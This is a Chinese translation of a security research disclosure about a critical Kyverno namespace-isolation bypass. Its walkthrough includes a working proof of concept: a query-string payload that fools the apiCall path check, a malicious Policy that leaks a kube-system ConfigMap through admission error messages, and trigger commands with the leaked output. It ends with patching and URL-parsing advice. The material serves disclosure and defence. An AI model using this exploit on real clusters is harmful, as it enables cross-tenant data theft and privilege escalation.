#  Kyverno CVSS 10.0漏洞：租户可越权访问集群资源  
Dubito
                    Dubito  云原生安全指北   2026-11-26 10:02  
  
   
  
> 注：本文翻译自 Akamai 的文章  
《How a URL Parser Differential Broke Kyverno’s Namespace Isolation》[1]  
，可点击文末“阅读原文”按钮查看英文原文。  
  
## 一、核心要点  
- • 我们近期在 Kyverno 中发现了一个关键漏洞，编号为   
GHSA-pcx2-xcq4-65vf[2]  
，CVSS 评分 10.0。  
  
- • 该漏洞允许被限制在单一命名空间的租户构造恶意 API 请求，访问集群级资源或其他命名空间，绕过策略验证。  
  
- • 成功利用可导致跨集群边界的未授权数据访问和权限提升。  
  
- • 受影响版本为：在修复补丁发布前，所有使用存在缺陷的 apiCall  
 路径验证逻辑的 Kyverno 版本。  
  
- • 根据 Akamai 的遥测数据，4% 的企业网络运行着存在漏洞的 Kyverno 实例。  
  
- • 该缺陷已在 1.19.2 版本中修复。  
  
## 二、Kyverno 架构内幕：解析器边界失效之处  
  
Kyverno[3]  
（希腊语“治理”之意）是一款流行的云原生策略引擎，由   
云原生计算基金会 (CNCF)[4]  
 维护，专为 Kubernetes 设计，允许平台团队管理集群安全、自动化合规、以代码形式强制执行最佳实践。近年来 Kyverno 广泛普及，在 Kubernetes 生态系统中备受青睐。  
  
构建安全边界时，解析文件路径与解析 URL 的细微差别可能彻底击穿沙箱。Kyverno 正是如此。由于 Kyverno 作为集群级准入控制器运行，因此需要高度特权的后台权限才能工作。  
  
这种架构使其成为 **混淆代理攻击（confused deputy attack）**  
 的首选目标。混淆代理是指高特权实体（代理方，如 Kyverno）被低特权用户（攻击者，被限制在单一命名空间）操纵，滥用其权限执行用户自身无法完成的操作。  
  
本文将剖析核心缺陷，并从零演示攻击过程。  
## 三、建立基线：测试命名空间边界  
  
为更好理解漏洞，我们先搭建测试环境。  
  
使用 miniKube（搭建本地 Kubernetes 集群的开源工具）演示漏洞，并通过 Helm Chart 下载 Kyverno。  
  
现在，在 “kube-system” 命名空间放置一个 Secret 作为靶标。（这是 Kubernetes 集群中最关键、最敏感的命名空间，承载维持集群运行的核心组件。）以下命令创建名为 target-cm  
 的 ConfigMap，包含伪造 secret 数据：key=confidential-data  
```
kubectl create configmap target-cm -n kube-system --from-literal=key=confidential-data
```  
  
攻击者目标是窃取该数据。  
  
接下来创建攻击者实体：一个严格绑定到 default 命名空间的低特权用户——当未指定命名空间时，用户创建对象的默认落地区。我们仅授予其在该隔离区域内读写 ConfigMap 和 Kyverno 策略的权限，别无其他：  
```
# 创建受限 ServiceAccountkubectl create sa policy-admin -n default# 创建 Role，仅允许在 default 命名空间管理策略和 ConfigMapkubectl create role policy-admin-role -n default \ --verb=create,get,list,update,delete \ --resource=policies.kyverno.io,configmaps# 将 Role 绑定到 ServiceAccountkubectl create rolebinding policy-admin-binding -n default \ --role=policy-admin-role \ --serviceaccount=default:policy-admin
```  
  
用 kubectl auth can-i  
 直接向 Kubernetes API Server 提问测试一下：  
> “如果我是 default 命名空间下的 policy-admin 用户，是否允许读取 kube-system 命名空间的 ConfigMap？”  
  
```
kubectl auth can-i get configmaps -n kube-system --as=system:serviceaccount:default:policy-admin# 输出: no
```  
  
Kubernetes API Server 明确回答 **no**  
。我们的目标是绕过限制，读取需要高特权的 kube-system 命名空间 ConfigMap。  
  
攻击者可在自己的命名空间（default）创建 Kyverno 策略。Kyverno 策略是集群的自动化治理引擎，拦截 Kubernetes API 请求以强制执行安全、合规和运维最佳实践。平台团队用它确保部署到集群的每个工作负载符合组织标准，无需人工审核。  
  
例如，平台团队想限制开发者在 default 命名空间可部署的容器镜像。与其将允许镜像列表硬编码进 Kyverno 策略，团队更倾向于将其存储在标准 Kubernetes ConfigMap allowed-images-list  
 中。  
  
开发者尝试部署 Pod 时，Kyverno 策略通过 apiCall  
 读取该 ConfigMap，检查 Pod 镜像是否在允许列表内。  
  
通过应用以下 YAML 实现：  
```
apiVersion: kyverno.io/v1kind: Policymetadata:  name: enforce-allowed-images  # 该策略严格绑定到 default 命名空间  namespace: defaultspec:  validationFailureAction: Enforce  rules:  - name: check-image-against-configmap    match:      any:      - resources:          kinds:          - Pod    context:    - name: allowedImagesList      apiCall:        urlPath: "/api/v1/namespaces/default/configmaps/allowed-images-list"        method: GET        # JMESPath 从 ConfigMap 的 data 中提取 'images' 字符串        jmesPath: "data.images"    validate:      message: "Deployment blocked: Your container image is not in the allowed list."      deny:        conditions:          all:          # 若 Pod 镜像不在从 ConfigMap 获取的字符串中，则拒绝          - key: "{{ request.object.spec.containers[0].image }}"            operator: NotIn            value: "{{ allowedImagesList }}"
```  
## 四、漏洞成因：利用解析差异注入不安全查询  
  
注意到了 urlPath  
 字段吗？这是 Kyverno **apiCall**  
 功能的一部分。Kyverno 策略常需根据当前待评估资源之外的数据进行动态决策。  
  
为此，Kyverno 允许策略编写者定义包含 apiCall  
 的 context 块。urlPath  
 让用户指定 Kyverno 应查询哪个 Kubernetes API 端点以获取外部数据。这是 Kyverno 特意设计的强大功能，故允许用户定义。  
### 4.1 问题所在  
  
用户可以诱使 Kyverno 使用 Kubernetes API 来满足自己的需求。Kyverno（1.19.2 版本前）维护者已考虑过此问题（实际上，此前 CVE   
CVE-2026-22039[5]  
 的补丁已处理过）。  
  
Fetch()  
 中的命名空间验证（pkg/engine/apicall/apiCall.go  
 第 68-106 行）会对 URLPath  
 使用 url.PathUnescape  
 和 path.Clean  
 处理后，再与 namespacePathRegex  
 匹配：  
```
var namespacePathRegex = regexp.MustCompile(\`^/api(s)?/.*?/namespaces/([^/]+)/?.*$\`)
```  
  
随后将提取的命名空间与用户权限核对。  
  
例如，urlPath  
 “/api/v1/namespaces/kube-system/secrets” 会被拦截，因为用户没有权限访问提取出的命名空间（kube-system）。  
  
但我们发现验证层与 HTTP 层存在 **解析器差异**  
。  
### 4.2 关键缺陷  
  
path.Clean()  
 设计用于 **文件路径**  
，非 URL。文件系统中问号（?  
）只是文件名普通字符，无特殊含义。但在 HTTP 请求中 ?  
 是控制字符，标志查询字符串开始。  
  
因 path.Clean()  
 未剥离查询字符串，验证正则扫描的是 **整个**  
 URL 字符串（含查询参数）。这种解析差异让攻击者能轻松将所需命名空间字符串偷渡到下游 HTTP 客户端会忽略的位置。  
  
**利用载荷示例**  
： /api/v1/configmaps?x=/namespaces/default/  
### 4.3 Kyverno 验证层如何处理载荷  
- • path.Clean()  
 会规范化该字符串。因视 ?  
 为普通字符，输出原串：/api/v1/configmaps?x=/namespaces/default/  
。  
  
- • 验证正则会扫描字符串。在 x=  
 查询参数中直接发现子串 /namespaces/default/  
。  
  
- • 正则提取 default  
 作为目标命名空间。  
  
提取的命名空间与策略命名空间一致，故 **放行**  
。  
  
### 4.4 Kubernetes 客户端如何处理载荷  
  
恶意载荷通过验证后，Kyverno 将字符串交给 client-go  
（Kubernetes HTTP 客户端）执行请求。client-go  
 正确将其解析为 URL，拆分为：  
  
路径：/api/v1/configmaps  
  
查询字符串：x=/namespaces/default/  
  
客户端成功对集群级 /api/v1/configmaps  
 端点发起 GET 请求。Kubernetes API Server 直接忽略无意义的 x  
 查询参数，攻击者成功获取集群级 ConfigMap 数据。  
  
至此我们知道攻击者可利用此缺陷诱导 Kyverno 以高特权列举所有 ConfigMap。但攻击者如何拿到 Kubernetes API 的响应呢？若策略直接通过，Kyverno 会静默批准虚拟 ConfigMap，攻击者永远看不到存储在变量中的数据。  
  
关键在于利用 Kyverno 的错误处理机制。  
  
Kyverno 拒绝请求时，必须告知 Kubernetes API Server 拒绝原因，以便 API Server 回传给用户。  
  
于是创建一个 **必定失败**  
 的策略，通过错误消息提取 secret。  
  
该 Kyverno 策略如下：  
```
cat <<'EOF' | kubectl apply --as=system:serviceaccount:default:policy-admin -f -apiVersion: kyverno.io/v1kind: Policymetadata:  name: cross-ns-leak  namespace: defaultspec:  validationFailureAction: Enforce  rules:  - name: leak-config    match:      resources:        kinds:        - ConfigMap    context:    - name: leakedData      apiCall:        urlPath: "/api/v1/configmaps?x=/namespaces/default/"        method: GET        jmesPath: "items[?metadata.namespace == 'kube-system' && metadata.name == 'target-cm'].data | [0]"    validate:      message: "LEAKED DATA: {{ leakedData }}"      deny: {}EOF
```  
  
注意我们用 JMESPath 过滤出 kube-system 目标，而非获取包含所有 ConfigMap 的巨大 JSON。  
  
现在尝试创建 ConfigMap 触发漏洞：  
```
cat <<EOF | kubectl apply --as=system:serviceaccount:default:policy-admin -f -apiVersion: v1kind: ConfigMapmetadata:  name: trigger-leak  namespace: default  annotations:    target_ns: "kube-system"    target_name: "target-cm"data: {}EOFError from server: error when creating "STDIN": admission webhook "validate.kyverno.svc-fail" denied the request:resource ConfigMap/default/trigger-leak was blocked due to the following policiescross-ns-leak:  leak-config: 'LEAKED DATA: {"key":"confidential-data"}'
```  
  
漂亮！ConfigMap 创建失败，但得益于错误消息，我们泄露了目标 secret。  
## 五、修复建议与给防御者的关键启示  
  
运行 Kyverno 的组织应 **立即升级至 1.19.2 或更高版本**  
 以修复 GHSA-pcx2-xcq4-65vf漏洞。  
  
除了修补该具体缺陷外，此漏洞还揭示了安全软件设计的关键教训：正则表达式虽可靠用于字符串匹配，但若输入的结构格式未先严格强制约束，极易被绕过。  
  
凡涉及 URL 检查的安全边界，开发者应避免使用 path.Clean()  
 等文件系统工具，改用专用 URL 解析器——如 Go 的 net/url.Parse  
——在对 url.Path  
 进行路径隔离检查 **前**  
 先剥离查询字符串（?  
）和片段（#  
）。  
  
最后，防御者应牢记：冗余的错误处理可能无意中成为数据外泄通道；在准入拒绝消息中返回未经处理的 API 响应，会让攻击者获得他们所需的反馈信息，从而将看似简单的请求转化为真正的数据泄露。  
#### 引用链接  
  
[1]  
 《How a URL Parser Differential Broke Kyverno’s Namespace Isolation》: https://www.akamai.com/blog/security-research/2026/nov/url-parser-differential-broke-kyvernos-namespace-isolation  
[2]  
 GHSA-pcx2-xcq4-65vf: https://github.com/kyverno/kyverno/security/advisories/GHSA-pcx2-xcq4-65vf  
[3]  
 Kyverno: https://kyverno.io/  
[4]  
 云原生计算基金会 (CNCF): https://www.cncf.io/  
[5]  
 CVE-2026-22039: https://github.com/advisories/GHSA-8p9x-46gm-qfx2  
  
   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/Kric7mM9eA5A6c77F4X2av9D1fFq6OlPeIZeYibuibCAks5pWNkCf03KlpqNpymDF8BoHYnr3syHZnp1gqQbk9sPeMw3RP4eEdAmfs0p87V6ts/640?wx_fmt=gif&from=appmsg "")  
  
  
  
**交流群**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5CKfHrUibj1FACSxoB6tx4VibtSc7kX7OOlmeOicrKRmCUBEeT5huAh0uTC6icuzvTaoIHB7mfQM3iaoicaEem0JE6Hc9WicxAiaL5rJPg/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
**知识库**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5DrkDxGYaEibVRTYkBNQgBUaw49IQ6TZXiawwXuWrUmGJ85gvTtAr6KDU1rlwXIMlcCZcd9SzJTIlcpfbYWxocRXTiaibDCHicfL4fI/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
**RSS源**  
  
  
作者搜集的高质量云安全RSS订阅源已开源：  
  
https://github.com/you8023/cloud_sec_rss  
  
（持续更新中，欢迎提PR ❤️）  
  
  
  
  
